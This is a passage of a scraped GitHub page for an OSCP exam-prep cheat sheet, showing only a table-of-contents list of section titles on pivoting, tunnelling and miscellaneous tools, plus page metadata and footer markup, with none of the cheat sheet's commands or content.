Redirection","kind":"section_1","ident_start":270217,"ident_end":270243,"extent_start":270215,"extent_end":291369,"fully_qualified_name":"8 Pivoting and Redirection","ident_utf16":{"start":{"line_number":7662,"utf16_col":2},"end":{"line_number":7662,"utf16_col":28}},"extent_utf16":{"start":{"line_number":7662,"utf16_col":0},"end":{"line_number":8190,"utf16_col":0}}},{"name":"8.1 SSH Tunnels","kind":"section_2","ident_start":270380,"ident_end":270395,"extent_start":270377,"extent_end":280525,"fully_qualified_name":"8.1 SSH Tunnels","ident_utf16":{"start":{"line_number":7667,"utf16_col":3},"end":{"line_number":7667,"utf16_col":18}},"extent_utf16":{"start":{"line_number":7667,"utf16_col":0},"end":{"line_number":7913,"utf16_col":0}}},{"name":"8.1.1 Ad Hoc SSH Port Forwards","kind":"section_3","ident_start":277489,"ident_end":277519,"extent_start":277485,"extent_end":278277,"fully_qualified_name":"8.1.1 Ad Hoc SSH Port Forwards","ident_utf16":{"start":{"line_number":7834,"utf16_col":4},"end":{"line_number":7834,"utf16_col":34}},"extent_utf16":{"start":{"line_number":7834,"utf16_col":0},"end":{"line_number":7849,"utf16_col":0}}},{"name":"8.1.2 SSH on Windows","kind":"section_3","ident_start":278281,"ident_end":278301,"extent_start":278277,"extent_end":279397,"fully_qualified_name":"8.1.2 SSH on Windows","ident_utf16":{"start":{"line_number":7849,"utf16_col":4},"end":{"line_number":7849,"utf16_col":24}},"extent_utf16":{"start":{"line_number":7849,"utf16_col":0},"end":{"line_number":7880,"utf16_col":0}}},{"name":"8.1.3 Creating restricted user for ssh port forwarding only","kind":"section_3","ident_start":279401,"ident_end":279460,"extent_start":279397,"extent_end":280525,"fully_qualified_name":"8.1.3 Creating restricted user for ssh port forwarding only","ident_utf16":{"start":{"line_number":7880,"utf16_col":4},"end":{"line_number":7880,"utf16_col":63}},"extent_utf16":{"start":{"line_number":7880,"utf16_col":0},"end":{"line_number":7913,"utf16_col":0}}},{"name":"8.2 SOCKS Proxies and proxychains","kind":"section_2","ident_start":280528,"ident_end":280561,"extent_start":280525,"extent_end":282464,"fully_qualified_name":"8.2 SOCKS Proxies and proxychains","ident_utf16":{"start":{"line_number":7913,"utf16_col":3},"end":{"line_number":7913,"utf16_col":36}},"extent_utf16":{"start":{"line_number":7913,"utf16_col":0},"end":{"line_number":7954,"utf16_col":0}}},{"name":"8.3 Bending with sshuttle","kind":"section_2","ident_start":282467,"ident_end":282492,"extent_start":282464,"extent_end":283141,"fully_qualified_name":"8.3 Bending with sshuttle","ident_utf16":{"start":{"line_number":7954,"utf16_col":3},"end":{"line_number":7954,"utf16_col":28}},"extent_utf16":{"start":{"line_number":7954,"utf16_col":0},"end":{"line_number":7969,"utf16_col":0}}},{"name":"8.4 Bending with socat","kind":"section_2","ident_start":283144,"ident_end":283166,"extent_start":283141,"extent_end":284454,"fully_qualified_name":"8.4 Bending with socat","ident_utf16":{"start":{"line_number":7969,"utf16_col":3},"end":{"line_number":7969,"utf16_col":25}},"extent_utf16":{"start":{"line_number":7969,"utf16_col":0},"end":{"line_number":8011,"utf16_col":0}}},{"name":"8.5 Bending with netcat","kind":"section_2","ident_start":284457,"ident_end":284480,"extent_start":284454,"extent_end":285043,"fully_qualified_name":"8.5 Bending with netcat","ident_utf16":{"start":{"line_number":8011,"utf16_col":3},"end":{"line_number":8011,"utf16_col":26}},"extent_utf16":{"start":{"line_number":8011,"utf16_col":0},"end":{"line_number":8033,"utf16_col":0}}},{"name":"8.6 Bending with iptables","kind":"section_2","ident_start":285046,"ident_end":285071,"extent_start":285043,"extent_end":286351,"fully_qualified_name":"8.6 Bending with iptables","ident_utf16":{"start":{"line_number":8033,"utf16_col":3},"end":{"line_number":8033,"utf16_col":28}},"extent_utf16":{"start":{"line_number":8033,"utf16_col":0},"end":{"line_number":8069,"utf16_col":0}}},{"name":"8.7 Bending with rinetd","kind":"section_2","ident_start":286354,"ident_end":286377,"extent_start":286351,"extent_end":287049,"fully_qualified_name":"8.7 Bending with rinetd","ident_utf16":{"start":{"line_number":8069,"utf16_col":3},"end":{"line_number":8069,"utf16_col":26}},"extent_utf16":{"start":{"line_number":8069,"utf16_col":0},"end":{"line_number":8083,"utf16_col":0}}},{"name":"8.8 Bending with netsh on Windows","kind":"section_2","ident_start":287052,"ident_end":287085,"extent_start":287049,"extent_end":288344,"fully_qualified_name":"8.8 Bending with netsh on Windows","ident_utf16":{"start":{"line_number":8083,"utf16_col":3},"end":{"line_number":8083,"utf16_col":36}},"extent_utf16":{"start":{"line_number":8083,"utf16_col":0},"end":{"line_number":8115,"utf16_col":0}}},{"name":"8.9 Bending with chisel","kind":"section_2","ident_start":288347,"ident_end":288370,"extent_start":288344,"extent_end":289674,"fully_qualified_name":"8.9 Bending with chisel","ident_utf16":{"start":{"line_number":8115,"utf16_col":3},"end":{"line_number":8115,"utf16_col":26}},"extent_utf16":{"start":{"line_number":8115,"utf16_col":0},"end":{"line_number":8147,"utf16_col":0}}},{"name":"8.10 Bending with `dnscat2`","kind":"section_2","ident_start":289677,"ident_end":289704,"extent_start":289674,"extent_end":291369,"fully_qualified_name":"8.10 Bending with `dnscat2`","ident_utf16":{"start":{"line_number":8147,"utf16_col":3},"end":{"line_number":8147,"utf16_col":30}},"extent_utf16":{"start":{"line_number":8147,"utf16_col":0},"end":{"line_number":8190,"utf16_col":0}}},{"name":"9 Miscellaneous","kind":"section_1","ident_start":291371,"ident_end":291386,"extent_start":291369,"extent_end":295994,"fully_qualified_name":"9 Miscellaneous","ident_utf16":{"start":{"line_number":8190,"utf16_col":2},"end":{"line_number":8190,"utf16_col":17}},"extent_utf16":{"start":{"line_number":8190,"utf16_col":0},"end":{"line_number":8340,"utf16_col":0}}},{"name":"9.1 Port Knocking","kind":"section_2","ident_start":291391,"ident_end":291408,"extent_start":291388,"extent_end":291826,"fully_qualified_name":"9.1 Port Knocking","ident_utf16":{"start":{"line_number":8192,"utf16_col":3},"end":{"line_number":8192,"utf16_col":20}},"extent_utf16":{"start":{"line_number":8192,"utf16_col":0},"end":{"line_number":8207,"utf16_col":0}}},{"name":"9.2 Convert text to Windows UTF-16 format on Linux","kind":"section_2","ident_start":291829,"ident_end":291879,"extent_start":291826,"extent_end":291982,"fully_qualified_name":"9.2 Convert text to Windows UTF-16 format on Linux","ident_utf16":{"start":{"line_number":8207,"utf16_col":3},"end":{"line_number":8207,"utf16_col":53}},"extent_utf16":{"start":{"line_number":8207,"utf16_col":0},"end":{"line_number":8214,"utf16_col":0}}},{"name":"9.3 Extract UDP pcap packet payload data","kind":"section_2","ident_start":291985,"ident_end":292025,"extent_start":291982,"extent_end":292625,"fully_qualified_name":"9.3 Extract UDP pcap packet payload data","ident_utf16":{"start":{"line_number":8214,"utf16_col":3},"end":{"line_number":8214,"utf16_col":43}},"extent_utf16":{"start":{"line_number":8214,"utf16_col":0},"end":{"line_number":8242,"utf16_col":0}}},{"name":"9.4 Execute Shellcode from Bash","kind":"section_2","ident_start":292628,"ident_end":292659,"extent_start":292625,"extent_end":293524,"fully_qualified_name":"9.4 Execute Shellcode from Bash","ident_utf16":{"start":{"line_number":8242,"utf16_col":3},"end":{"line_number":8242,"utf16_col":34}},"extent_utf16":{"start":{"line_number":8242,"utf16_col":0},"end":{"line_number":8258,"utf16_col":0}}},{"name":"9.5 Encryption","kind":"section_2","ident_start":293527,"ident_end":293541,"extent_start":293524,"extent_end":294629,"fully_qualified_name":"9.5 Encryption","ident_utf16":{"start":{"line_number":8258,"utf16_col":3},"end":{"line_number":8258,"utf16_col":17}},"extent_utf16":{"start":{"line_number":8258,"utf16_col":0},"end":{"line_number":8297,"utf16_col":0}}},{"name":"9.5.1 Create self-signed SSL/TLS certificate","kind":"section_3","ident_start":293547,"ident_end":293591,"extent_start":293543,"extent_end":294326,"fully_qualified_name":"9.5.1 Create self-signed SSL/TLS certificate","ident_utf16":{"start":{"line_number":8260,"utf16_col":4},"end":{"line_number":8260,"utf16_col":48}},"extent_utf16":{"start":{"line_number":8260,"utf16_col":0},"end":{"line_number":8281,"utf16_col":0}}},{"name":"9.5.2 Decrypting files with GPG","kind":"section_3","ident_start":294330,"ident_end":294361,"extent_start":294326,"extent_end":294629,"fully_qualified_name":"9.5.2 Decrypting files with GPG","ident_utf16":{"start":{"line_number":8281,"utf16_col":4},"end":{"line_number":8281,"utf16_col":35}},"extent_utf16":{"start":{"line_number":8281,"utf16_col":0},"end":{"line_number":8297,"utf16_col":0}}},{"name":"9.6 Validating Checksums","kind":"section_2","ident_start":294632,"ident_end":294656,"extent_start":294629,"extent_end":295056,"fully_qualified_name":"9.6 Validating Checksums","ident_utf16":{"start":{"line_number":8297,"utf16_col":3},"end":{"line_number":8297,"utf16_col":27}},"extent_utf16":{"start":{"line_number":8297,"utf16_col":0},"end":{"line_number":8310,"utf16_col":0}}},{"name":"9.7 Inspecting Files with Exiftool","kind":"section_2","ident_start":295059,"ident_end":295093,"extent_start":295056,"extent_end":295994,"fully_qualified_name":"9.7 Inspecting Files with Exiftool","ident_utf16":{"start":{"line_number":8310,"utf16_col":3},"end":{"line_number":8310,"utf16_col":37}},"extent_utf16":{"start":{"line_number":8310,"utf16_col":0},"end":{"line_number":8340,"utf16_col":0}}}]}},"copilotInfo":null,"copilotAccessAllowed":false,"modelsAccessAllowed":false,"csrf_tokens":{"/camercu/oscp-prep/branches":{"post":"kZr-aWSN5tLSF2gYdpr-KuwtrqeG6Sw8wAiciiSfKR7NQpQeKljC4Y6wfon1JA7Pc6PedNxqu5zVtclzaP9R4A"},"/repos/preferences":{"post":"JGAJhaUeilt72fcHaaqO6m8kOLrbCD2Es4qrX2tYvFEoPsZydXnZpz2cQwOoJ4qumUt-Q_rt38J4oTdHKjzwRQ"}}},"title":"oscp-prep/CHEATSHEET.md at main 路 camercu/oscp-prep","appPayload":{"helpUrl":"https://docs.github.com","findFileWorkerPath":"/assets-cdn/worker/find-file-worker-9f8a877aa99f.js","findInFileWorkerPath":"/assets-cdn/worker/find-in-file-worker-eb3d353f90ce.js","githubDevUrl":null,"enabled_features":{"code_nav_ui_events":false,"overview_shared_code_dropdown_button":false,"react_blob_overlay":false,"copilot_conversational_ux_embedding_update":false,"copilot_smell_icebreaker_ux":true,"accessible_code_button":true}}}</script>
  <div data-target="react-app.reactRoot"></div>
</react-app>
</turbo-frame>



  </div>

</turbo-frame>

    </main>
  </div>

  </div>

          <footer class="footer pt-8 pb-6 f6 color-fg-muted p-responsive" role="contentinfo" >
  <h2 class='sr-only'>Footer</h2>

  


  <div class="d-flex flex-justify-center flex-items-center flex-column-reverse flex-lg-row flex-wrap flex-lg-nowrap">
    <div class="d-flex flex-items-center flex-shrink-0 mx-2">
      <a aria-label="Homepage" title="GitHub" class="footer-octicon mr-2" href="https://github.com">
        <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-mark-github">
    <path d="M12.5.75C6.146.75 1 5.896 1 12.25c0 5.089 3.292 9.387 7.863 10.91.575.101.79-.244.79-.546 0-.273-.014-1.178-.014-2.142-2.889.532-3.636-.704-3.866-1.35-.13-.331-.69-1.352-1.18-1.625-.402-.216-.977-.748-.014-.762.906-.014 1.553.834 1.769 1.179 1.035 1.74 2.688 1.25 3.349.948.1-.747.402-1.25.733-1.538-2.559-.287-5.232-1.279-5.232-5.678 0-1.25.445-2.285 1.178-3.09-.115-.288-.517-1.467.115-3.048 0 0 .963-.302 3.163 1.179.92-.259 1.897-.388 2.875-.388.977 0 1.955.13 2.875.388 2.2-1.495 3.162-1.179 3.162-1.179.633 1.581.23 2.76.115 3.048.733.805 1.179 1.825 1.179 3.09 0 4.413-2.688 5.39-5.247 5.678.417.36.776 1.05.776 2.128 0 1.538-.014 2.774-.014 3.162 0 .302.216.662.79.547C20.709 21.637 24 17.324 24 12.25 24 5.896 18.854.75 12.5.75Z"></path>
</svg>
</a>
      <span>
        &copy; 2025 GitHub,&nbsp;Inc.
      </span>
    </div>

    <nav aria-label="Footer">
      <h3 class="sr-only" id="sr-footer-heading">Footer navigation</h3>

      <ul class="list-style-none d-flex flex-justify-center flex-wrap mb-2 mb-lg-0" aria-labelledby="sr-footer-heading">

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to Terms&quot;,&quot;label&quot;:&quot;text:terms&quot;}" href="https://docs.github.com/site-policy/github-terms/github-terms-of-service" data-view-component="true" class="Link--secondary Link">Terms</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to privacy&quot;,&quot;label&quot;:&quot;text:privacy&quot;}" href="https://docs.github.com/site-policy/privacy-policies/github-privacy-statement" data-view-component="true" class="Link--secondary Link">Privacy</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to security&quot;,&quot;label&quot;:&quot;text:security&quot;}" href="https://github.com/security" data-view-component="true" class="Link--secondary Link">Security</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to status&quot;,&quot;label&quot;:&quot;text:status&quot;}" href="https://www.githubstatus.com/" data-view-component="true" class="Link--secondary Link">Status</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to docs&quot;,&quot;label&quot;:&quot;text:docs&quot;}" href="https://docs.github.com/" data-view-component="true" class="Link--secondary Link">Docs</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to contact&quot;,&quot;label&quot;:&quot;text:contact&quot;}" href="https://support.github.com?tags=dotcom-footer" data-view-component="true" class="Link--secondary Link">Contact</a>
          </li>

          <li class="mx-2" >
  <cookie-consent-link>
    <button
      type="button"
      class="Link--secondary underline-on-hover border-0 p-0 color-bg-transparent"
      data-action="click:cookie-consent-link#showConsentManagement"
      data-analytics-event="{&quot;location&quot;:&quot;footer&quot;,&quot;action&quot;:&quot;cookies&quot;,&quot;context&quot;:&quot;subfooter&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;cookies_link_subfooter_footer&quot;}"
    >
      Manage cookies
    </button>
  </cookie-consent-link>
</li>

<li class="mx-2">
  <cookie-consent-link>
    <button
      type="button"
      class="Link--secondary underline-on-hover border-0 p-0 color-bg-transparent"
      data-action="click:cookie-consent-link#showConsentManagement"
      data-analytics-event="{&quot;location&quot;:&quot;footer&quot;,&quot;action&quot;:&quot;dont_share_info&quot;,&quot;context&quot;:&quot;subfooter&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;dont_share_info_link_subfooter_footer&quot;}"
    >
      Do not share my personal information
    </button>
  </cookie-consent-link>
</li>

      </ul>
    </nav>
  </div>
</footer>




    <ghcc-consent id="ghcc" class="position-fixed bottom-0 left-0" style="z-index: 999999" data-initial-cookie-consent-allowed="" data-cookie-consent-required="false"></ghcc-consent>


  <div id="ajax-error-message" class="ajax-error-message flash flash-error" hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <button type="button" class="flash-close js-ajax-error-dismiss" aria-label="Dismiss error">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
    </button>
    You cant perform that action at this time.
  </div>

    <template id="site-details-dialog">
  <details class="details-reset details-overlay details-overlay-dark lh-default color-fg-default hx_rsm" open>
    <summary role="button" aria-label="Close dialog"></summary>
    <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast hx_rsm-dialog hx_rsm-modal">
      <button class="Box-btn-octicon m-0 btn-octicon position-absolute right-0 top-0" type="button" aria-label="Close dialog" data-close-dialog>
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
      </button>
      <div class="octocat-spinner my-6 js-details-dialog-spinner"></div>
    </details-dialog>
  </details>
</template>

    <div class="Popover js-hovercard-content position-absolute" style="display: none; outline: none;">
  <div class="Popover-message Popover-message--bottom-left Popover-message--large Box color-shadow-large" style="width:360px;">
  </div>
</div>

    <template id="snippet-clipboard-copy-button">
  <div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0" data-copy-feedback="Copied!" data-tooltip-direction="w">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none m-2">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
    </clipboard-copy>
  </div>
</template>
<template id="snippet-clipboard-copy-button-unpositioned">
  <div class="zeroclipboard-container">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
    </clipboard-copy>
  </div>
</template>




    </div>

    <div id="js-global-screen-reader-notice" class="sr-only mt-n1" aria-live="polite" aria-atomic="true" ></div>
    <div id="js-global-screen-reader-notice-assertive" class="sr-only mt-n1" aria-live="assertive" aria-atomic="true"></div>
  </body>
</html>

